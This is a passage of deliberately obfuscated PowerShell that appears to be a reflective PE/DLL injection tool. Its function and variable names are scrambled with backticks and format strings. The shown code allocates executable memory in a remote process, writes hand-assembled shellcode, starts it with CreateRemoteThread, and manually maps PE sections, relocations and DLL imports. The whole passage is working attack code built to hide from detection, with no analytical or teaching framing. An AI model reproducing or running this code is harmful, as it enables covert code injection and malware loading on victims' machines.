		      ${Z`F`I2Wh}::("{2}{3}{0}{1}" -f 'a','l','FreeHGl','ob').Invoke(${fuNCTiONn`A`M`epTr})
		    if (${su`C`ceSS} -eq ${f`ALsE})
		    {
			    Throw ("{9}{3}{4}{12}{7}{11}{1}{6}{10}{13}{0}{5}{8}{2}" -f' mem','r','y','w','rite','o','emote ',' t','r','Unable to ','pr','o ',' DLL path','ocess')
		    }
		    if (${F`UN`c`TIO`N`NAMesiZE} -ne ${NUMBYTes`w`R`ITt`EN})
		    {
			    Throw ((("{17}{10}{9}{5}{11}{6}{1}{3}{19}{18}{7}{0}{16}{12}{4}{14}{15}{8}{2}{13}"-f'i','mo','th','unt of bytes ','LL','ite','ed a','n wr',' load to ','t wr','n{0}',' the expect','a D','e remote process',' pa','th to','ting ','Did','e','wh')) -f [CHaR]39)
		    }
		
		    
		    ${KeR`N`El32`hANd`le} = ${wIN32F`Un`cT`iONS}."getmoDUle`HanD`le"."inv`Oke"(("{3}{2}{0}{1}" -f'l32.dl','l','e','kern'))
		    ${getpro`caD`D`ReSSADDR} = ${Win32FuncT`I`ONS}."GeT`p`R`ocA`DdREss"."In`Voke"(${KeRnEL32`ha`NDlE}, ("{3}{1}{2}{0}"-f 'Address','Pr','oc','Get')) 

		
		    
		    ${get`PrOC`A`ddrESsRetM`Em} = ${WIn`32`FUN`CTi`ONS}."VIr`TUAl`ALL`Oc`eX"."in`VOkE"(${rE`Mo`TeproCha`ND`le},  (  &("{0}{2}{1}{3}" -f 'gEt-VaR','Ab','i','le') ("{0}{1}" -f 'bqT','A'))."v`AluE"::"z`ERo", [UInt64][UInt64]${PtrS`I`Ze}, ${WIn32`c`On`s`TanTS}."Mem_`coMM`iT" -bor ${wi`N3`2C`OnSTantS}."M`EM_rEsE`Rve", ${w`I`N32`Con`staNtS}."pAG`E_rE`ADWri`Te")
		    if (${GEt`PRo`cadD`R`eSSreTmEm} -eq  ( &("{1}{0}" -f 'M','ITE') ('VarI'+'AbL'+'E:bqtA')  )."VaL`UE"::"z`eRO")
		    {
			    Throw ("{13}{9}{16}{10}{17}{12}{7}{15}{3}{5}{2}{11}{1}{14}{0}{6}{4}{8}"-f 'value of',' retur','s','p','rocAddr','roces',' GetP','emote','ess','ble to ','a',' for the',' in the r','Una','n ',' ','alloc','te memory')
		    }
		
		
		    
		    
		    
		    [Byte[]]${getpr`oCAddR`Es`SsC} = @()
		    if (${PE`iNfo}."pE`64b`it" -eq ${TR`UE})
		    {
			    ${geTPRo`C`ADD`R`Ess`sc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			    ${Get`Pr`oCa`dDReSSS`C2} = @(0x48, 0xba)
			    ${g`etpr`OCA`d`D`ReSsSc3} = @(0x48, 0xb8)
			    ${GeTpR`O`caD`DrES`ssC4} = @(0xff, 0xd0, 0x48, 0xb9)
			    ${geTprocadDr`E`Sss`c5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    else
		    {
			    ${gETPR`O`cADdr`ESss`c1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			    ${G`EtPRoc`Addresss`c2} = @(0xb9)
			    ${geTP`Ro`C`Ad`DrEsSsC3} = @(0x51, 0x50, 0xb8)
			    ${GE`T`P`Ro`caddreSSSc4} = @(0xff, 0xd0, 0xb9)
			    ${ge`T`pRoc`ADdrE`S`sSC5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		    }
		    ${sCleNg`TH} = ${GEt`pRo`Ca`D`drEsSSC1}."l`E`Ngth" + ${geTp`RocAdDre`S`SsC2}."leng`TH" + ${GET`Pr`Oc`ADdR`esSS`C3}."lE`N`GTh" + ${getPRo`cADDrEss`S`C4}."l`EngtH" + ${gET`P`RocaD`D`R`esSSC5}."le`N`gTH" + (${p`TRsI`zE} * 4)
		    ${sCp`sM`Em} =  ( &('LS')  ("V"+"aRia"+"BlE:"+"zF"+"I2wh") )."va`lUe"::("{1}{3}{0}{2}" -f'loba','AllocH','l','G').Invoke(${Sclen`GTH})
		    ${s`CpS`m`EMOrIgI`NAl} = ${sCp`S`mem}
		
		    &("{1}{4}{0}{5}{2}{3}"-f'e-Byt','W','M','emory','rit','esTo') -Bytes ${gEtPROcAD`D`R`esSs`c1} -MemoryAddress ${sC`psMem}
		    ${s`cPs`mem} = &("{0}{2}{4}{3}{1}" -f'Add-','ed','SignedI','ign','ntAsUns') ${SCpsm`em} (${GEtpRO`caDD`Re`s`s`sC1}."l`engTh")
		     (  &("{0}{1}"-f 'GC','i') ("{0}{1}{3}{2}" -f'VAR','i','H','AblE:ZFI2w') )."Val`UE"::("{0}{1}{2}" -f 'Stru','ctureToPt','r').Invoke(${Remot`edlL`HAND`LE}, ${SC`psmEM}, ${FA`Lse})
		    ${S`cPSmEm} = &("{0}{4}{2}{3}{1}"-f 'Add-S','AsUnsigned','gne','dInt','i') ${S`C`PsMEm} (${PT`RSI`Ze})
		    &("{0}{3}{2}{5}{4}{1}"-f 'Wr','ry','Byt','ite-','mo','esToMe') -Bytes ${gET`PROcA`D`dRE`ss`SC2} -MemoryAddress ${scPS`m`EM}
		    ${s`CPSMeM} = &("{4}{0}{5}{1}{2}{6}{3}"-f '-Sign','ntA','sU','ed','Add','edI','nsign') ${sCP`S`mem} (${getpRoc`Ad`Dr`esss`C2}."L`EnGth")
		     ( &("{3}{4}{1}{0}{2}" -f 'dIte','il','m','geT-','Ch')  ('VAr'+'IAB'+'Le:ZFI2Wh') )."V`AlUE"::("{3}{1}{2}{0}{4}" -f 're','truc','tu','S','ToPtr').Invoke(${rfunCnam`Ep`TR}, ${S`cpsmem}, ${fA`l`Se})
		    ${SC`PS`MEm} = &("{6}{4}{3}{1}{5}{2}{0}" -f'ed','s','gn','n','d-SignedIntAsU','i','Ad') ${scP`s`MeM} (${Ptrsi`Ze})
		    &("{1}{3}{5}{0}{4}{2}" -f '-BytesToM','Wr','mory','i','e','te') -Bytes ${G`ETPRoca`d`dr`EsssC3} -MemoryAddress ${ScP`s`mem}
		    ${ScP`sM`eM} = &("{1}{2}{3}{0}{4}" -f 'ntAsUnsigne','Add','-Si','gnedI','d') ${S`c`psMEm} (${geTpROca`dD`ReSsS`c3}."LEN`g`Th")
		     ${z`FI2`wH}::("{1}{0}{2}{3}"-f 't','S','ructu','reToPtr').Invoke(${GetpR`O`cAD`drES`S`A`dDr}, ${sC`ps`MEm}, ${f`AlSe})
		    ${s`cpSm`eM} = &("{1}{3}{4}{2}{6}{0}{5}{7}" -f'ign','Add','ignedIntAs','-','S','e','Uns','d') ${scp`SM`em} (${P`TrSize})
		    &("{2}{1}{3}{4}{0}" -f'mory','ite-Bytes','Wr','T','oMe') -Bytes ${GeT`PRoCAdDr`e`SSsc4} -MemoryAddress ${scP`s`meM}
		    ${S`CPS`MEm} = &("{5}{2}{6}{0}{4}{3}{1}" -f's','ed','edInt','nsign','U','Add-Sign','A') ${Sc`Psmem} (${GetPR`O`cAdDRe`ss`s`c4}."LENG`TH")
		      ${Z`Fi2wH}::("{3}{1}{2}{4}{0}"-f 'r','tu','reTo','Struc','Pt').Invoke(${GETP`RO`cA`DDrES`SRe`TMEm}, ${sC`P`SMeM}, ${Fa`lsE})
		    ${sCPsM`Em} = &("{1}{3}{2}{4}{7}{0}{6}{5}" -f'tAsUn','Add','Signe','-','dI','ed','sign','n') ${s`CP`sMEm} (${PtR`s`izE})
		    &("{0}{3}{2}{1}" -f'Write','mory','e','-BytesToM') -Bytes ${GEtProcAdd`R`ESsS`C5} -MemoryAddress ${sC`p`smem}
		    ${sC`psm`em} = &("{2}{3}{1}{0}{4}{5}{6}"-f'nedI','g','Add-S','i','ntAs','Unsig','ned') ${sCpS`mEM} (${getpr`OCadDR`ES`ss`C5}."LEnG`TH")
		
		    ${r`sCad`dr} = ${W`in32fUNC`Ti`OnS}."V`irTU`AlaLLO`cex"."iN`V`OkE"(${Re`MOte`pROcHA`NDLe},   (  &("{1}{2}{0}"-f 'tEM','chIl','Di')  ("{3}{0}{4}{2}{1}"-f 'BL','TA','bQ','VaRIA','e:')  )."VA`LUe"::"z`ero", [UIntPtr][UInt64]${scle`NgtH}, ${wiN32CONs`T`AN`Ts}."M`Em_cO`mMIT" -bor ${WiN32`Cons`T`AnTs}."M`eM`_r`EseRVe", ${WI`N32`CO`NS`TantS}."pA`Ge_E`xeCUTe_reA`dWRI`Te")
		    if (${r`SCADDR} -eq   ${b`qTA}::"ZE`RO")
		    {
			    Throw ("{17}{13}{8}{7}{12}{5}{0}{3}{14}{16}{11}{6}{9}{4}{15}{10}{1}{2}" -f'e me','s','hellcode','mory','ss ','cat',' proc','o a','ble t','e','r ','he remote','llo','na',' ','fo','in t','U')
		    }
		
		    ${su`CCe`Ss} = ${wiN3`2FUnCtI`ONS}."Wr`itEp`Roc`eSs`ME`mOry"."inV`oKe"(${R`em`ote`proCHA`NDlE}, ${Rsc`AD`dR}, ${Scp`s`Me`MOr`IGInal}, [UIntPtr][UInt64]${sC`l`ENGtH}, [Ref]${NU`MBY`Te`s`wRitT`En})
		    if ((${sUcc`E`SS} -eq ${F`AL`sE}) -or ([UInt64]${Nu`Mb`yT`EsWri`TtEn} -ne [UInt64]${sCL`Ength}))
		    {
			    Throw ("{6}{8}{1}{4}{9}{10}{5}{11}{0}{7}{12}{2}{3}"-f 'ote ',' w','emor','y.','rite','lcode to ','Unable','p',' to',' ','shel','rem','rocess m')
		    }
		
		    ${rtH`Re`ADHA`N`DLe} = &("{4}{3}{0}{5}{2}{1}"-f'e-','ad','teRemoteThre','ok','Inv','Crea') -ProcessHandle ${re`mOt`eP`ROc`HanD`Le} -StartAddress ${Rsca`D`dR} -Win32Functions ${WIn32f`UN`C`T`IOnS}
		    ${Re`S`ULt} = ${wIn3`2fUn`cti`onS}."W`A`iTFOr`siN`Gl`EObJecT"."I`NvOkE"(${r`ThREa`DhA`NdlE}, 20000)
		    if (${rE`su`LT} -ne 0)
		    {
			    Throw ("{1}{0}{7}{5}{3}{4}{6}{9}{8}{2}"-f'a','C','.','ate','RemoteThread to call','e',' GetProcAddress','ll to Cr','d',' faile')
		    }
		
		    
		    [IntPtr]${RetUR`NVA`lM`em} =   ${zf`i`2wH}::("{1}{0}{2}" -f 'HGlo','Alloc','bal').Invoke(${Pt`RS`iZe})
		    ${r`ESU`lt} = ${wi`N32`FuNC`TioNs}."reaDP`R`ocESsME`MOry"."I`NvOKe"(${rE`MO`T`EPRo`CHANdLe}, ${g`ETpr`O`cAdDRESsr`ET`M`em}, ${retUr`Nv`ALm`eM}, [UIntPtr][UInt64]${p`TRsIZE}, [Ref]${nu`MBytEsWRi`Tt`EN})
		    if ((${reS`UlT} -eq ${FAL`Se}) -or (${nuMBYtE`SWriT`T`EN} -eq 0))
		    {
			    Throw ("{1}{5}{4}{2}{3}{0}"-f 'ed','Cal','fai','l','sMemory ','l to ReadProces')
		    }
		    [IntPtr]${pRO`c`AdDREsS} =  (  &("{3}{2}{0}{1}" -f 'vA','riAblE','eT-','G')  ("{1}{0}"-f'i2WH','ZF')  -VALU)::"PT`R`ToStRuc`TuRE"(${R`ET`URNV`ALmEm}, [Type][IntPtr])

		    ${wIN32fU`NC`T`ionS}."vIRT`Ualf`R`EeeX"."iNv`OkE"(${Rem`OTeP`RocHa`NdLe}, ${rs`CAddR}, [UIntPtr][UInt64]0, ${WIn3`2cOn`STa`N`Ts}."m`e`M_RELE`ASe") | &("{2}{1}{0}"-f'-Null','t','Ou')
		    ${WIn32f`UN`CtIonS}."V`I`RTUAlfrE`e`Ex"."in`V`oke"(${rem`OT`EprOChANd`LE}, ${RFuncn`AM`e`ptR}, [UIntPtr][UInt64]0, ${Win32C`o`NStaN`Ts}."me`m_rE`leAsE") | &("{2}{1}{0}" -f'll','u','Out-N')
		    ${Win3`2`FU`NcTIOnS}."V`IrTUAlfRE`eEX"."i`Nv`OkE"(${R`E`MOTE`ProC`hAnDLe}, ${g`EtpRocA`DDR`eSSre`TmEM}, [UIntPtr][UInt64]0, ${wi`N`32CON`S`TANtS}."MEm_rE`l`EaSE") | &("{1}{0}{2}" -f'l','Out-Nu','l')
		
		    return ${P`R`oCaDdRess}
	    }


	    Function COP`y-s`E`c`TioNS
	    {
		    Param(
		    [Parameter(POsition = 0, MAndAtOrY = ${T`RUE})]
		    [Byte[]]
		    ${pEB`y`TES},
		
		    [Parameter(poSITiON = 1, maNDAtoRY = ${tR`Ue})]
		    [System.Object]
		    ${pE`IN`FO},
		
		    [Parameter(POsItIoN = 2, MANDaTOry = ${T`Rue})]
		    [System.Object]
		    ${W`In3`2`FU`Nctions},
		
		    [Parameter(pOSiTioN = 3, manDAtORy = ${tR`UE})]
		    [System.Object]
		    ${WIN`32TY`PES}
		    )
		
		    for( ${i} = 0; ${I} -lt ${P`EI`Nfo}."I`maG`e_`Nt`_hEAde`RS"."f`i`LEheaDeR"."nuMbEroF`sect`IO`NS"; ${i}++)
		    {
			    [IntPtr]${se`CTIo`N`HEaderPtR} = [IntPtr](&("{4}{0}{3}{1}{5}{2}{6}"-f 'n','ntAsU','gn','edI','Add-Sig','nsi','ed') ([Int64]${peiN`FO}."sE`CTIoNhe`A`dErptR") (${I} *   ( &('gI') ('vARiabL'+'E:'+'zfI2'+'Wh'))."VA`lUE"::"SI`zeOF"([Type]${wIn32T`y`PES}."Im`AGE_`SeCTi`On`_h`EaD`ER")))
			    ${S`EC`TIOnH`eadEr} =  (&("{0}{1}"-f 'g','cI')  ("{2}{0}{3}{1}{4}" -f'rIA','LE:ZF','va','b','I2WH'))."V`AlUE"::"PT`Rt`ostr`UC`TURe"(${sE`C`TiON`HeADeRpTR}, [Type]${WI`N32`T`YpES}."ImaGE_SECT`IoN_`hEa`DER")
		
			    
			    [IntPtr]${secT`ioN`d`EstAD`dr} = [IntPtr](&("{1}{0}{2}{4}{3}" -f'dIntAsUn','Add-Signe','s','ned','ig') ([Int64]${P`E`INfO}."peHan`Dle") ([Int64]${sEcTiONHE`AD`Er}."vir`T`UaLAdDrESS"))
			
			    
			    
			    
			    
			    ${Si`zEO`F`Raw`DAtA} = ${sect`Ion`hEaD`er}."SIZe`O`FraWdata"

			    if (${s`eC`TiO`Nh`EAdeR}."POi`NterT`O`R`AWData" -eq 0)
			    {
				    ${sIzEo`Fr`AWDaTA} = 0
			    }
			
			    if (${S`iZ`e`OFraWda`Ta} -gt ${se`ct`IOn`hEa`der}."VI`RTuAL`sIze")
			    {
				    ${Sizeofr`A`W`DAtA} = ${sEc`TIOnHE`ADer}."vir`T`UaLsizE"
			    }
			
			    if (${si`zeofR`AWd`AtA} -gt 0)
			    {
				    &("{0}{2}{3}{4}{1}"-f 'Test-MemoryR','id','an','geVa','l') -DebugString ("{1}{3}{0}{4}{2}{5}" -f 'y-Sec','C','s::Marsh','op','tion','alCopy') -PEInfo ${p`eINFO} -StartAddress ${SE`ct`Iond`ESta`dDR} -Size ${si`ZeOFRa`WD`ATA} | &("{1}{0}" -f 'ut-Null','O')
				     ${zf`I2WH}::"CO`py"(${P`eb`yTes}, [Int32]${se`CT`IonHEAd`eR}."P`OiNT`e`RTOrawdA`TA", ${Sec`T`ioNde`STaDDR}, ${s`iZ`EofrAWdaTa})
			    }
		
			    
			    if (${s`ecTiO`NhEad`Er}."siZeO`F`RAWd`AtA" -lt ${SE`Ct`IO`NheADER}."vir`Tual`Si`ZE")
			    {
				    ${DI`FFER`en`CE} = ${S`eCtiOn`heADER}."vIrTUA`Ls`Ize" - ${S`IzeoFRa`Wd`Ata}
				    [IntPtr]${st`ARt`AD`DresS} = [IntPtr](&("{1}{4}{0}{5}{2}{3}"-f 'dI','Add-Sign','gn','ed','e','ntAsUnsi') ([Int64]${s`ecTiONd`ESTAd`dR}) ([Int64]${Si`ZEof`Ra`Wd`ATA}))
				    &("{4}{1}{0}{2}{3}" -f'an','est-MemoryR','ge','Valid','T') -DebugString ("{1}{2}{0}{3}"-f'ctions::Mems','Copy-S','e','et') -PEInfo ${Pe`INFo} -StartAddress ${sT`ARta`dDr`esS} -Size ${D`IF`F`eReNcE} | &("{1}{2}{0}" -f'l','Out-Nu','l')
				    ${WiN32fUnCT`i`OnS}."M`EmSEt"."iNVO`Ke"(${S`T`ArTADdrE`SS}, 0, [IntPtr]${Diffe`RE`Nce}) | &("{1}{2}{0}"-f 'ull','O','ut-N')
			    }
		    }
	    }


	    Function Up`dA`Te-m`eM`oRyadd`ResSEs
	    {
		    Param(
		    [Parameter(POsITION = 0, MaNDatoRY = ${Tr`Ue})]
		    [System.Object]
		    ${p`e`INfO},
		
		    [Parameter(pOsition = 1, MAndaTORy = ${T`Rue})]
		    [Int64]
		    ${o`R`iGI`Nal`iMAGE`BASE},
		
		    [Parameter(PosItiON = 2, MAndatORY = ${T`RUE})]
		    [System.Object]
		    ${WIN32`CoN`STants},
		
		    [Parameter(pOsiTion = 3, MaNdAtory = ${tR`UE})]
		    [System.Object]
		    ${W`IN32Ty`p`es}
		    )
		
		    [Int64]${ba`sedIfFeREn`ce} = 0
		    ${AdD`DIFfER`ENcE} = ${t`RUE} 
		    [UInt32]${ImaGE`B`ASEreL`o`CSIzE} =  ${Z`Fi2wH}::"S`iZeOf"([Type]${W`i`N32tY`PeS}."iMAg`E_b`A`Se_RE`l`oCat`ion")
		
		    
		    if ((${oR`IgIn`A`LImAGEbAse} -eq [Int64]${p`e`INFo}."EfFE`c`T`ivEPE`HAnDlE") `
				    -or (${Pei`N`Fo}."iMaGE_nT`_H`Ea`deRs"."optIon`ALhE`Ad`er"."b`AS`E`Re`l`ocAtIont`ABLe"."S`IZE" -eq 0))
		    {
			    return
		    }


		    elseif ((&("{2}{0}{6}{7}{3}{1}{5}{4}" -f'ompar','2AsUI','C','1GreaterThanVal','t','n','e-Va','l') (${Or`IgiNALIm`Ageb`AsE}) (${pEI`NFo}."eFf`e`CTivEp`eHA`Nd`Le")) -eq ${TR`Ue})
		    {
			    ${bA`SE`DIf`FER`Ence} = &("{3}{1}{2}{0}{4}"-f'ntAs','b-Sig','nedI','Su','Unsigned') (${oRI`GI`NaLiM`AGEBa`se}) (${Pe`INfo}."EF`F`e`CT`IVePE`haNDlE")
			    ${add`di`FFER`EN`ce} = ${F`Al`sE}
		    }
		    elseif ((&("{4}{5}{2}{0}{1}{6}{3}"-f 'anVal2As','UI','1GreaterTh','t','Comp','are-Val','n') (${PEI`Nfo}."EFfeCT`IvE`PeH`ANd`Le") (${O`R`Igi`NalImAG`ebasE})) -eq ${Tr`UE})
		    {
			    ${Ba`S`EdiFf`ER`EnCE} = &("{0}{3}{1}{4}{2}" -f'Sub','U','igned','-SignedIntAs','ns') (${Pe`iN`Fo}."e`F`FeCTivEPEhAnD`Le") (${oriGIn`ALIMA`geb`ASE})
		    }
		
		    
		    [IntPtr]${bAsEr`e`Lo`cP`TR} = [IntPtr](&("{2}{0}{1}{5}{3}{4}" -f 'd-Si','gnedInt','Ad','nsigne','d','AsU') ([Int64]${pe`I`NFo}."peh`AND`le") ([Int64]${P`eiNFo}."I`m`AgE_n`T_he`AdErS"."OP`TiOnalH`EaDER"."BaS`E`RelocatioN`T`ABLe"."VI`Rt`UAlAdd`R`Ess"))
		    while(${tr`UE})
		    {
			    
			    ${B`AsER`elO`C`A`TIo`NTablE} =  ${Z`FI2Wh}::"pTR`T`OS`TruCTure"(${bAS`ereLOC`PTr}, [Type]${W`In3`2TYp`ES}."I`MAGe_Ba`Se_`RELoCa`Tion")

			    if (${BAs`ERe`LOCAT`Io`NtA`Ble}."s`iZ`EoF`BLOcK" -eq 0)
			    {
				    break
			    }

			    [IntPtr]${m`EmadD`Rb`AsE} = [IntPtr](&("{3}{0}{4}{2}{1}"-f 'S','edIntAsUnsigned','n','Add-','ig') ([Int64]${peI`NFO}."p`e`HAndLE") ([Int64]${b`As`EreLOCaTIO`NTabLE}."virtUa`lAdDr`eSs"))
			    ${NuMREL`ocA`TIO`Ns} = (${BAsEr`El`oc`AtI`ONtAbLE}."SizeO`FB`L`oCk" - ${IMa`ge`BAs`ErElO`C`s`izE}) / 2

			    
			    for(${I} = 0; ${I} -lt ${Nu`MrELo`cAtiO`NS}; ${I}++)
			    {
				    
				    ${rEL`oCAt`IO`NI`NF`oPTR} = [IntPtr](&("{4}{3}{0}{1}{2}"-f 'sU','ns','igned','SignedIntA','Add-') ([IntPtr]${Ba`s`eREL`oCp`TR}) ([Int64]${im`AgEBAs`E`RElo`c`S`izE} + (2 * ${i})))
				    [UInt16]${R`eloc`ATiOnI`NFO} =  ${Z`Fi`2WH}::"ptr`TOs`TRu`Ctu`Re"(${R`eLO`cAtIONi`N`FoPtr}, [Type][UInt16])

				    
				    [UInt16]${Rel`oCOf`Fset} = ${r`eL`OCAt`iONINFo} -band 0x0FFF
				    [UInt16]${R`ELoC`TyPE} = ${Re`lo`c`AtionInfO} -band 0xF000
				    for (${j} = 0; ${j} -lt 12; ${J}++)
				    {
					    ${RE`Lo`C`TYPe} =   (  &("{2}{3}{1}{0}"-f 'ble','A','GET-Va','rI') ("{0}{1}" -f'T','01hJ9')  -valUeonly )::("{0}{1}" -f'Flo','or').Invoke(${r`eloct`YpE} / 2)
				    }

				    
				    
				    
				    if ((${rE`LOct`Y`pE} -eq ${Win32Co`NST`A`NTS}."i`ma`ge_`RE`L_BAsED`_HIGh`LOW") `
						    -or (${rE`l`OctYpe} -eq ${W`iN3`2co`N`sTANTs}."I`ma`G`E`_Rel_`BaSED`_dIR64"))
				    {			
					    
					    [IntPtr]${Fi`N`ALadDr} = [IntPtr](&("{1}{2}{3}{0}"-f'tAsUnsigned','A','dd-SignedI','n') ([Int64]${m`EMa`DDrbASe}) ([Int64]${relO`CO`FF`SEt}))
					    [IntPtr]${CURRA`DDr} =  ( &('gI') ('VaRiAb'+'LE:'+'zFI2'+'Wh')  )."va`lUe"::"pTRt`OsTR`U`cTure"(${finA`lA`DDr}, [Type][IntPtr])
		
					    if (${AdddifF`er`en`cE} -eq ${tR`Ue})
					    {
						    [IntPtr]${CU`RRA`ddr} = [IntPtr](&("{1}{3}{0}{4}{2}" -f'-SignedIntAsUnsi','Ad','ned','d','g') ([Int64]${c`U`RRAd`DR}) (${B`ASE`DIff`EREN`ce}))
					    }
					    else
					    {
						    [IntPtr]${cU`R`RaDdR} = [IntPtr](&("{3}{5}{4}{2}{0}{1}" -f'signe','d','n','Su','IntAsU','b-Signed') ([Int64]${cu`R`Ra`Ddr}) (${B`AS`EDIFf`EReN`Ce}))
					    }				

					      (  &('lS')  ("varIaBL"+"E:z"+"Fi"+"2WH"))."val`Ue"::("{2}{1}{3}{0}" -f 'r','tureToP','Struc','t').Invoke(${CU`R`RADdR}, ${f`INalad`dr}, ${fA`l`sE}) | &("{2}{0}{1}"-f 't-Nul','l','Ou')
				    }
				    elseif (${rE`lOctY`pe} -ne ${w`iN3`2CoNst`ANTS}."imagE`_`REl_Ba`SeD_ABS`ol`Ute")
				    {
					    
					    Throw ('Unkn'+'o'+'wn '+'relocatio'+'n'+' '+'found'+', '+'r'+'elocation'+' '+'v'+'al'+'ue: '+"$RelocType, "+'relocationinfo'+':'+' '+"$RelocationInfo")
				    }
			    }
			
			    ${bA`S`eRElocptr} = [IntPtr](&("{3}{1}{5}{0}{4}{2}" -f 'nedIn','S','Unsigned','Add-','tAs','ig') ([Int64]${Ba`s`Erel`o`CPtR}) ([Int64]${bAs`er`eloc`ATiO`NtABlE}."si`z`EOf`BlOCK"))
		    }
	    }


	    Function iMpO`RT`-`dLLim`P`ORTs
	    {
		    Param(
		    [Parameter(pOsItIon = 0, MAndAtORY = ${T`RUe})]
		    [System.Object]
		    ${p`einFo},
		
		    [Parameter(posITiON = 1, mANdaTOrY = ${T`RUe})]
		    [System.Object]
		    ${WI`N3`2Fu`NCTIoNs},
		
		    [Parameter(poSITION = 2, manDatory = ${tr`Ue})]
		    [System.Object]
		    ${wi`N32t`y`pEs},
		
		    [Parameter(pOSitiON = 3, mAndAtORy = ${TR`Ue})]
		    [System.Object]
		    ${wIn`32cO`N`sta`NTs},
		
		    [Parameter(PoSItiON = 4, MaNDATOrY = ${f`A`LsE})]
		    [IntPtr]
		    ${R`Em`OTE`p`Roch`ANdlE}
		    )
		
		    ${Rem`O`TelOAd`InG} = ${F`Al`se}
		    if (${P`e`INfO}."P`eHa`Ndle" -ne ${pEi`Nfo}."eFfeC`TIVEPEH`An`D`Le")
		    {
			    ${reMOtEl`oAd`i`NG} = ${Tr`UE}
		    }
		
		    if (${pE`iN`FO}."iMa`Ge_Nt_hEa`d`Ers"."OpTiONA`LHE`AD`ER"."imP`orTtaB`lE"."SI`Ze" -gt 0)
		    {
			    [IntPtr]${im`pO`RtD`E`SCRipToR`ptr} = &("{6}{5}{7}{2}{1}{0}{4}{3}"-f's','AsUn','nt','ned','ig','ig','Add-S','nedI') ([Int64]${PEI`NFO}."p`eHaN`DLe") ([Int64]${p`E`iNFo}."I`MAge`_Nt`_heaDe`RS"."oP`T`iOnalHe`ADeR"."IM`PorT`TaBLe"."vIr`T`UaLad`dresS")
			
			    while (${Tr`UE})
			    {
				    ${i`MpO`R`T`d`escrIPTor} =   ${zF`i2Wh}::"p`Trto`sTructU`RE"(${impO`Rtd`e`ScR`iPtorp`Tr}, [Type]${W`in32TY`P`ES}."imaG`E_imPoRT_dE`sCR`ipt`OR")
				
				    
				    if (${Im`P`OrTd`ES`CRIP`Tor}."ChAracT`eri`sTicS" -eq 0 `
						    -and ${IMP`OrtDES`cRip`T`oR}."FIr`S`TTHunK" -eq 0 `
						    -and ${i`mpO`RtdeSC`R`IptOr}."FoRWa`Rd`E`R`cHaiN" -eq 0 `
						    -and ${im`poR`T`DeScR`iptoR}."nA`me" -eq 0 `
						    -and ${ImPOR`Td`Esc`R`IPTor}."tiMEDATe`StA`mp" -eq 0)
				    {
					    &("{0}{1}{2}" -f'Write','-Verbos','e') ("{1}{3}{2}{0}{4}"-f'im','Don','porting DLL ','e im','ports')
					    break
				    }

				    ${Im`pORt`dlLHa`N`dlE} =   ${bq`Ta}::"ze`RO"
				    ${I`mpOrtdL`lpa`T`HpTr} = (&("{3}{0}{2}{4}{1}"-f 'dd-','d','Si','A','gnedIntAsUnsigne') ([Int64]${pe`i`NFo}."P`ehanD`lE") ([Int64]${i`M`P`orTDEsCrI`Pt`OR}."NA`mE"))
				    ${Impor`TD`LlPAtH} =   (&('LS')  ("{4}{3}{1}{2}{0}"-f'2wh','F','i','E:Z','VARiABl')  )."V`ALue"::("{0}{3}{2}{1}" -f 'P','StringAnsi','rTo','t').Invoke(${IMpORT`DlLP`ATHP`Tr})
				
				    if (${R`e`MoTeL`Oad`iNg} -eq ${T`RUE})
				    {
					    ${im`PO`RtDlLHA`NdLe} = &("{1}{4}{3}{0}{2}" -f 'ote','Impo','Process','t-DllInRem','r') -RemoteProcHandle ${reMO`Te`prOC`hAN`D`lE} -ImportDllPathPtr ${i`M`pORT`D`L`LpAtHPtR}
				    }
				    else
				    {
					    ${ImpoRtD`l`lHAn`DLE} = ${win32f`Unc`TioNS}."lOAd`L`iBRAry"."I`N`VOKE"(${i`m`pORt`d`LLPaTH})
				    }

				    if ((${iMpor`TDL`Lh`AnD`Le} -eq ${nu`ll}) -or (${ImpoRt`dLLHA`Nd`le} -eq  ${B`QTa}::"z`ErO"))
				    {
					    throw ('E'+'rror '+'i'+'mportin'+'g '+'DLL,'+' '+'D'+'LLNa'+'me: '+"$ImportDllPath")
				    }
				
				    
				    [IntPtr]${ThUN`k`ReF} = &("{2}{1}{4}{0}{3}" -f'AsUns','dI','Add-Signe','igned','nt') (${p`EinfO}."PehanD`le") (${i`Mp`or`T`dEscRIPTOr}."fIRs`T`THu`NK")
				    [IntPtr]${OriG`iNaLT`h`UNKreF} = &("{3}{4}{1}{2}{0}{5}"-f 'ign','dIntA','sUns','Add-S','igne','ed') (${Pe`iN`Fo}."P`eHa`NDle") (${IMPortDEs`c`RIp`T`oR}."c`hArAC`TErIs`TI`cS") 
				    [IntPtr]${ORIgIna`LTH`U`Nkr`eFVal} =  (  &("{0}{1}{2}{3}"-f'geT','-vA','Riab','Le') ("{0}{1}{2}"-f'Z','f','i2wh'))."Val`UE"::"pTrT`OstRuC`TUre"(${orIGin`A`lt`hUNKREf}, [Type][IntPtr])
				
				    while (${OrIG`INal`TH`UnKREF`VaL} -ne   (&("{0}{2}{1}" -f'c','Em','HildIT')  ("VArIAbLe"+":"+"BqTa") )."v`ALUE"::"Z`ErO")
				    {
					    ${procEDu`R`Ename} = ''
					    
					    
					    
					    [IntPtr]${N`EWtH`UnKR`Ef} =   (&("{2}{0}{1}"-f'et-vA','RiABLe','G')  ("{0}{1}" -f 'Bq','TA') -vAlUEOn  )::"zE`Ro"
					    if([Int64]${oR`i`ginALt`h`UN`KRefvAl} -lt 0)
					    {
						    ${P`RocEdu`R`En`AMe} = [Int64]${O`R`i`GINA`l`THu`NKRefVAL} -band 0xffff 
					    }
					    else
					    {
						    [IntPtr]${S`T`RIngaD`dr} = &("{1}{3}{2}{5}{4}{0}"-f'd','Add-Signe','i','dIntAsUns','ne','g') (${pe`INfo}."PEHan`DLE") (${OrI`gIN`AL`T`hunkRe`FvAl})
						    ${s`TrInga`ddr} = &("{5}{3}{1}{4}{2}{0}" -f 'ned','SignedIntAsU','g','-','nsi','Add') ${ST`RiN`GAddr} ( (&("{0}{1}{2}" -f'c','HilDI','TEm')  ('VaRI'+'AblE:ZFi2'+'w'+'H')  )."v`AlUe"::"s`izeoF"([Type][UInt16]))
